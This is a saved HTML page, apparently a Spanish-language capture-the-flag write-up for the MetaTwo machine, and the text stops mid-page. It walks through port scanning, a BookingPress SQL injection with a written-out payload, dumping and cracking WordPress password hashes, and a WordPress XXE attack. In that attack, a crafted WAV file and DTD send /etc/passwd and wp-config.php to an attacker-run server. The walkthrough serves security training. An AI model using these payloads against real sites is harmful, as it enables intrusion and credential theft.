@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./metatwo.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">MetaTwo</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
+<pre><code>python whichSystem.py 10.10.11.186
+</code></pre>
+<p>Tiene como salida:</p>
+<pre class=" language-bash"><code class="prism  language-bash">10.10.11.186 <span class="token punctuation">(</span>ttl -<span class="token operator">&gt;</span> 63<span class="token punctuation">)</span>: Linux
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="descubrimiento-de-puertos-y-servicios">2. Descubrimiento de puertos y servicios</h2>
+<pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.186
+</code></pre>
+<p>Obtenemos el siguiente resultado:</p>
+<pre><code>PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-dichos-puertos">3. Comprobamos servicios y lanzamos scripts principales contra dichos puertos</h2>
+<pre><code>nmap -sCV -p21,22,80 10.10.11.186
+</code></pre>
+<p>Observamos que nos devuelve la siguiente salida:</p>
+<pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
+|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
+|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+|_http-server-header: nginx/1.18.0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.93SVN%I=7%D=2/28%Time=63FE1B4A%P=x86_64-unknown-linux-gn
+SF:u%r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff
+SF::10\.10\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20mor
+SF:e\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
+SF:creative\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>Debemos añadir entonces <strong>metapress.htb</strong> al archivo <code>/etc/hosts</code>:</p>
+<p>&nbsp;</p>
+<h2 id="recorremos-la-página-web">4. Recorremos la página web</h2>
+<p>Navegando por la página web observamos que existe un recurso específico para la gestión y reserva de eventos <code>http://metapress.htb/events/</code>. Mirando el código fuente, o mediante la herramienta <strong>Wapalyzer</strong>, nos damos cuenta de que utiliza el software <code>BookingPress</code>. Podemos entonces buscar por internet alguna vulnerabilidad asociado con dicho servicio, apareciendo entonces la siguiente: <code>https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</code>.</p>
+<p>En dicho exploit se nos pide, que por ejemplo ejecutemos el siguiente comando, para obtener la versión de la base de datos:</p>
+<pre><code>curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+</code></pre>
+<p>Pero observamos como no causa ningun efecto, y por lo tanto no se produce ninguna salida. Investigando un poco sobre dicho exploit nos damos que esto puede ser debido por el <code>wpnonce</code>, pues no es igual para todos los casos, por lo que buscamos dicho valor en el código fuente de la página web y obtenemos el siguiente valor <code>wpnonce=9ac98eaf15</code>. Por lo que ahora ejecutamos el siguiente comando con el nuevo valor de <em>wponce</em> establecido:</p>
+<pre><code>curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=9ac98eaf15&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+</code></pre>
+<p>Observamos entonces la siguiente salida, en la que somos capaces de obtener la versión de diferentes servicios:</p>
+<pre><code>[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]#
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="automatización-del-ataque">5. Automatización del ataque</h2>
+<p>Llegados a este punto podemos tratar de sacar información manualmente realizando peticiones contra la base de datos. O directamente utilizar la función <em>sqlmap</em> para lanzar un ataque automático contra dicha base datos. Nosotros nos vamos a decantar por esta segunda opción. Para ello primero deberemos enviar la siguiente petición <em>curl</em> para que sea procesada por nuestro <em>proxy</em> (<code>burp</code>):</p>
+<pre><code>curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=9ac98eaf15&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x 127.0.0.1:8080
+</code></pre>
+<p>Una vez capturada, la guardamos en un archivo con extensión <code>.req</code>, en nuestro caso con el nombre <em>request.req</em>. A mayores debemos de modificar el contenido de dicho archivo, quitando la parte de la inyección y quedando de la siguiente manera, con el campo <code>total_service</code> con el valor 1.</p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/7.87.0
+Accept: */*
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=9ac98eaf15&amp;category_id=33&amp;total_service=1
+</code></pre>
+<p>A continuación con la herramienta <strong>sqlmap</strong> deberemos de seleccionar la petición a realizar y el parámetro sobre el cual queremos hacer la inyección, que en nuestro caso será <code>total_service</code>. En un primer momento listamos las bases de datos de dicha aplicación, ejecutando para ello el siguiente comando:</p>
+<pre><code>sqlmap -r request.req -p total_service --dbs
+</code></pre>
+<p>Y obtenemos que existen las dos siguientes bases de datos:</p>
+<pre><code>[17:23:39] [INFO] fetching database names available databases [2]:
+[*] blog
+[*] information_schema
+</code></pre>
+<p>Lìstamos la informacion de las tablas de la primera base de datos mediante el siguiente comando:</p>
+<pre><code>sqlmap -r request.req -p total_service -D blog --tables
+</code></pre>
+<p>Y obtenemos la siguiente salida:</p>
+<pre><code>| wp_bookingpress_appointment_bookings |
+| wp_bookingpress_categories           |
+| wp_bookingpress_customers            |
+| wp_bookingpress_customers_meta       |
+| wp_bookingpress_customize_settings   |
+| wp_bookingpress_debug_payment_log    |
+| wp_bookingpress_default_daysoff      |
+| wp_bookingpress_default_workhours    |
+| wp_bookingpress_entries              |
+| wp_bookingpress_form_fields          |
+| wp_bookingpress_notifications        |
+| wp_bookingpress_payment_logs         |
+| wp_bookingpress_services             |
+| wp_bookingpress_servicesmeta         |
+| wp_bookingpress_settings             |
+| wp_commentmeta                       |
+| wp_comments                          |
+| wp_links                             |
+| wp_options                           |
+| wp_postmeta                          |
+| wp_posts                             |
+| wp_term_relationships                |
+| wp_term_taxonomy                     |
+| wp_termmeta                          |
+| wp_terms                             |
+| wp_usermeta                          |
+| wp_users                             |
+</code></pre>
+<p>Nos llama la atención la última tabla llamada <code>wp_users</code>, por lo que procedemos a extraer su contenido mediante el siguiente comando:</p>
+<pre><code>sqlmap -r request.req -p total_service -D blog -T wp_users --dump
+</code></pre>
+<p>Y observamos las dos siguientes entradas, en las que podemos ver dos usuarios (admin y manager) y dos contraseñas en formato <em>hash</em> para cada uno de ellos:</p>
+<pre><code>1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | &lt;blank&gt;    
+2  | &lt;blank&gt;              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | &lt;blank&gt;  
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="crackear-los-hashes-de-las-contraseñas">6. Crackear los hashes de las contraseñas</h2>
+<p>Podemos entonces intentar crackear los hashes de las contraseñas utilizando para ello la herramienta <strong>jhon</strong>. Para ello creamos un archivo <code>hashes</code> con el siguiente contenido:</p>
+<pre><code>hashes:
+
+    $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+    $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+</code></pre>
+<p>Y utilizando como dicctionario <code>rockyou.txt</code> lanzamos la herramienta <strong>jhon</strong>:</p>
+<pre><code>john -w=/usr/share/wordlists/rockyou.txt hashes
+</code></pre>
+<p>Siendo capaz de obtener que para el usuario <strong>manager</strong>, su credencial es <code>partylikearockstar</code>.</p>
+<p>&nbsp;</p>
+<h2 id="intento-de-acceso-al-sistema">7. Intento de acceso al sistema</h2>
+<p>Luego de comprobar que no podemos acceder al servicio <strong>ftp</strong>, ni al servicio <strong>ssh</strong> con dichos credenciales de usuario, intentamos acceder al panel de configuracion de <strong>wordpress</strong>, el cual está en el <em>endpoint</em> <code>http://metapress.htb/wp-admin</code>. Luego de introducir dichos credenciales (manager:partylikearockstar), podemos ver como tenemos acceso.</p>
+<p>Con la extensión del <code>wapalyzer</code> vemos que estamos ante un <strong>wordpress version 5.6.2</strong>, por lo que podemos buscar exploits por Internet que afecten a dicha versión, encontrando <code>https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447</code>, en el que a grandes rasgos nos dicen que podemos realizar una explotación <strong>XSS</strong> mediante un archivo <em>.wav</em>. Para ello es necesario realizar los siguientes pasos:</p>
+<ol>
+<li>
+<p>Empezamos creando un archivo <em>.wav</em>, mediante el siguiente comando, en el que le decimos que obtenga de nuestra maquina host un archivo en formate <em>.dtd</em>.</p>
+<pre><code>echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'http://10.10.14.93:8888/evil.dtd'"'"'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload.wav
+</code></pre>
+</li>
+<li>
+<p>Creamos entonces el archivo <code>evil.dtd</code>, con el siguiente contenido, en el que le decimos a la máquina objetivo que nos realiza una petición http, con el contenido el base64 del archivo <code>/etc/passwd</code>:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.93:8888/?p=%file;'&gt;" &gt;
+</code></pre>
+</li>
+<li>
+<p>Lanzamos un servidor con Python, en el directorio en el que creamos el archivo <code>evil.dtd</code>:</p>
+<pre><code>sudo python -m http.server 8888
+</code></pre>
+</li>
+<li>
+<p>Subimos el archivo .wav al siguiente endpoint <code>http://metapress.htb/wp-admin/media-new.php</code>. Y observamos que automáticamente obtenemos la siguiente respuesta:</p>
+<pre><code>10.10.11.186 - - [01/Mar/2023 10:48:29] "GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
+</code></pre>
+<p>Si decodificamos esto en <em>base64</em>, por ejemplo con la herramienta <strong>ciberchef</strong>, observamos que se trata del fichero <code>/etc/passwd</code>:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+</code></pre>
+</li>
+</ol>
+<p>&nbsp;</p>
+<h2 id="explotación-de-xss">8. Explotación de XSS</h2>
+<p>En este punto se nos puede ocurrir obtener por ejemplo la clave <strong>ssh</strong> del usuario <strong>jnelson</strong>, mediante la vulnerabilidad XSS. Pero observamos que no obtenemos nada de vuelta, por lo que descartamos esta opción.</p>
+<p>Podemos intentar obtener el archivo de configuracion del servicio <strong>ftp</strong>. Este normalmente se encuentra en la ruta <code>/etc/vsftpd.conf</code> pero no somos capaces de obtener nada. También probamos con la ruta <code>/etc/proftpd.conf</code> y <code>/etc/proftpd/proftpd.conf</code> pues se trata del servicio <code>proftpd</code>pero tampoco somos capaces de obtener nada.</p>
+<p>Se nos ocurre mirar entonces la extensión <strong>wappalyzer</strong> sabiendo que la página web utiliza el servicio <strong>nginx</strong>, por lo que intentamos obtener el fichero de configuracion de <code>sites-available</code>. Para ello deberemos de configurar el archivo <code>evil.dtd</code>, con el siguiente contenido:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/nginx/sites-enabled/default"&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.93:8888/?p=%file;'&gt;" &gt;
+</code></pre>
+<p>Luego de decoficarlo en base64, observamos que obtenemos lo siguiente:</p>
+<pre><code>server {
+
+    listen 80;
+    listen [::]:80;
+
+    root /var/www/metapress.htb/blog;
+
+    index index.php index.html;
+
+        if ($http_host != "metapress.htb") {
+                rewrite ^ http://metapress.htb/;
+        }
+
+    location / {
+        try_files $uri $uri/ /index.php?$args;
+    }
+    
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
+    }
+
+    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
+        expires max;
+        log_not_found off;
+    }
+
+}
+</code></pre>
+<p>Como podemos observar, no encontramos nada interesante. Sabemos a mayores que utiliza <strong>wordpress</strong>, asique intentamos obtener el fichero de configuracion <code>wp-config.php</code>. Este como podemos saber del anterior fichero se va a encontrar en la ruta <code>/var/www/metapress.htb/blog</code>, por lo que deberemos de configurar el archivo <code>evil.dtd</code> de la siguiente manera:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php"&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.93:8888/?p=%file;'&gt;" &gt;
+</code></pre>
+<p>Observando que obtenemos el siguiente resultado:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/** The name of the database for WordPress */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_NAME'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL database username */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'blog'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL database password */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string">'635Aq@TdqrCwXFUZ'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL hostname */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_HOST'</span><span class="token punctuation">,</span> <span class="token string">'localhost'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** Database Charset to use in creating database tables. */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_CHARSET'</span><span class="token punctuation">,</span> <span class="token string">'utf8mb4'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** The Database Collate type. Don't change this if in doubt. */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'DB_COLLATE'</span><span class="token punctuation">,</span> <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
